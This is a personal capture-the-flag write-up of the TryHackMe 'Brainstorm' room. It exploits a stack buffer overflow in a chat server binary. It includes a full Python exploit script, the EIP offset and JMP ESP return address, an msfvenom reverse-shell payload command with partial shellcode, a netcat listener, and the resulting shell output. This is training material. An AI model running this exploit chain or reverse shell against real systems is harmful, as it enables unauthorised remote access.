# Brainstorm [TryHackMe]

<sub>_This is a raw write-up. I write these to document important things for myself to use later if I need it. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.94.151
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -p- -Pn $targ3t -oN nmap.scan -vv
```

It appears that open ports for this machine are `21`, `3389` and `9999`. Let's perform a script scan on these:

```
nmap -p 21,3389,9999 --script=vuln $targ3t -oN nmap.vuln.scan -vv
```

It doesn't seem like the ports have obvious vulnerabilities, but port `21` or `ftp` allows anonymous login, so let's do it:

```
ftp anonymous@targ3t
```

We can see that there is a chatserver directory and in it we have `chatserver.exe` and `essfunc.dll`. Let's download both.

Now going to port `9999`, where it seems like this chatserver is running, it doesn't have anything suspicious:

```
nc 10.10.227.170 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Write a message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


Mon Feb 24 09:49:58 2025
AAAAAAAAAAAAAAAAAAAA said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

To test this properly, I'll mount a local Windows VM. This [write-up](https://amirr0r.github.io/posts/thm-brainstorm/) here is using `x64dbg`, which is an open-source reverse engineering application and I absolutely loved it, so I'll be using this one too. 

<sup>_For context, I tried to go through this workflow with Immunity Debugger and `mona`, but it didn't work, because of the wrong Python configuration and I didn't try to correct it, because I didn't like Immunity Debugger and `mona` very much anyway, so I thought this could be a good way to explore alternatives_</sup>

First we need to fuzz this `Write a message:` input field. I decided to do this manually, by generating cyclic patterns of different length, incrementing by 100. Finally this is the one that worked:

``` 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
```

This crashed the application, while 2000 didn't. Which means the offset is somewhere in-between. Now we need to navigate to `x32dbg` and copy the value of the EIP register:

```
31704330
```

Then we check this value with a pattern offset:

```
└─$ /usr/bin/msf-pattern_offset -q 31704330
[*] Exact match at offset 2012
```

Now we need to write a script, that we will use as an exploit more than once:

```python3
#!/usr/bin/env python3
import socket
import time

ip = "192.168.0.111"  # Target IP
port = 9999  # Target Port

username = "A" * 20

offset = 2012
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

message = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Connected to target.")

    print("Sending username...")
    s.sendall(bytes(username + "\r\n", "latin-1"))

    time.sleep(1)  # Adjust based on response timing

    print("Sending evil buffer as a message...")
    s.sendall(bytes(message + "\r\n", "latin-1"))

    print("Done!")
except Exception as e:
    print(f"Could not connect: {e}")
finally:
    s.close()
```

I borrowed this code from the [Buffer Overflow Prep](../thm_bufferoverflow/README.md) room and modified it to work with this app.

Now I'm going to use this script to find out if EIP will be overwritten with 4 `B`s if I put them in `retn` variable:

```
overflow = "A" * offset
retn = "BBBB"
```

And then launch it:

```
python3 exploit.py
```

And this does overwrite the EIP with `42424242` which is `BBBB` in hex:

```
EIP     42424242
```

Now that we're sure we control the EIP, let's generate an array of characters and send them on top of this buffer. I borrowed a script from the above-mentioned Buffer Overflow Prep room:

```python3
#!/usr/bin/env python3

import sys

def generate_bytearray(excluded_bytes):
    excluded = bytes.fromhex(excluded_bytes.replace("\\x", "").lower())
    print("".join(f"\\x{x:02x}" for x in range(256) if x not in excluded))

if __name__ == "__main__":
    excluded_bytes = sys.argv[1] if len(sys.argv) > 1 else ""
    generate_bytearray(excluded_bytes)
```

The command to generate all bytes except `\x00` is:

```
python3 bytearray.py "\x00"
```

Now we need to copy the output into `padding` variable in our exploit and launch it:

```
python3 exploit.py
```

Now we are going to need an `ERC.Xdbg` plugin to proceed further, so make sure to install it and if done, configure it in the command input:

```
ERC --config SetWorkingDirectory C:\Users\user\Desktop\
```

And then generate a bytearray:

```
ERC --bytearray
```

After that you can copy ESP address and compare two bytearrays byte by byte:

```
ERC --compare 0109EEAC C:\Users\user\Desktop\ByteArray_1.bin
```

It seems like there are no bad chars. 

Now we need to find a return address and write it to the EIP. With the help of `ERC.Xdbg` plugin we can search for modules used by this binary, with disabled security protections:

```
ERC --ModuleInfo -NXCompat
```

Only two modules have all protections set to `False`, it's the binary itself and `essfunc.dll` file. Now we need to go to the __Symbols__ tab in the debugger and double click this `dll` file. 

Press Ctrl+F to display a find input and type `jmp esp`. It displays a list of memory addresses which are jump points to ESP. Let's use the very first one:

```
625014DF
```

So converting this to little endian and writing it into `retn` variable would be the first step: `\xdf\x14\x50\x62`

But the next step would be to generate an actual shellcode to work with this:

```
msfvenom -p 'windows/shell_reverse_tcp' LHOST=192.168.0.109 LPORT=9822 -f c --bad-chars="\x00" --var-name payload
```

Copy the output and paste it into the `payload` variable inside the parentheses like this:

```
payload = ("\xda\xd0\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\xba\x25\xf3"
...
"\x4b\xea\x3c\x94\x4e\xb6\xfa\x45\x23\xa7\x6e\x69\x90\xc8"
"\xba")
```

Now start a netcat listener and launch the exploit again:

```
nc -lvnp 9822
python3 exploit.py
```

The output is the shell:

```
listening on [any] 9822 ...
connect to [192.168.0.109] from (UNKNOWN) [192.168.0.111] 49898
Microsoft Windows [Version 10.0.22621.4890]
(c) Microsoft Corporation. All rights reserved.

C:\Users\windows\Desktop>whoami
whoami
desktop-n9ia851\windows

C:\Users\windows\Desktop>
```

Taking all of this to the actual TryHackMe Brainstorm machine and generating another shellcode with my VPN IP, I got the root flag:

```
C:\Users\drake\Desktop>type root.txt
type root.txt
................................
C:\Users\drake\Desktop>
```
